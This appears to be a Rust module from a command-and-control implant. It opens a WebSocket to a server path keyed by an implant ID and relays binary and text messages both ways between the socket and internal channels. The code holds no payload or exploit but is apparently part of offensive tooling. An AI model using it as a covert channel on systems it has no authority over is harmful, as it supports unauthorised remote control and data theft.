use anyhow::Result;
use futures::{SinkExt, StreamExt};
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::protocol::Message;
use tokio_tungstenite::connect_async;
use tracing::{error, info};
use url::Url;

pub struct WsTransport {
    pub url: String,
    pub implant_id: String,
}

impl WsTransport {
    pub fn new(domain: &str, implant_id: &str) -> Self {
        Self {
            url: format!("wss://{}/t/wss/{}", domain, implant_id),
            implant_id: implant_id.to_string(),
        }
    }

    pub async fn connect(
        &self,
        mut rx: mpsc::Receiver<Vec<u8>>,
        tx: mpsc::Sender<Vec<u8>>,
    ) -> Result<()> {
        let url = Url::parse(&self.url)?;
        info!("Connecting to WSS: {}", self.url);

        let (ws_stream, _) = connect_async(url).await?;
        let (mut write, mut read) = ws_stream.split();

        let send_task = tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                if write.send(Message::Binary(msg)).await.is_err() {
                    break;
                }
            }
        });

        let recv_task = tokio::spawn(async move {
            while let Some(msg) = read.next().await {
                match msg {
                    Ok(Message::Binary(data)) => {
                        if tx.send(data).await.is_err() {
                            break;
                        }
                    }
                    Ok(Message::Text(text)) => {
                        if tx.send(text.into_bytes()).await.is_err() {
                            break;
                        }
                    }
                    Err(e) => {
                        error!("WSS recv error: {}", e);
                        break;
                    }
                    _ => {}
                }
            }
        });

        tokio::try_join!(send_task, recv_task)?;
        Ok(())
    }
}
